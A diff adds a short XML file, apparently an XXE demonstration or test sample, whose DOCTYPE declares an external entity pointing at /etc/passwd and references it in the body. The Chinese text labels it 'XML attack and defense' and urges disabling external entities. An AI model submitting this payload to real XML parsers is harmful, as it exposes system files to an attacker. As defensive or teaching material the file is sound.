@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<!DOCTYPE request [
+		<!ENTITY include SYSTEM "/etc/passwd"> ]>
+
+<repost>
+	<repost email="zhoujunhui">
+		<title>xml攻防</title>
+		<doc>xml解析可造成任意命令执行，请禁止外部实体&include;</doc>
+	</repost>
+</repost>
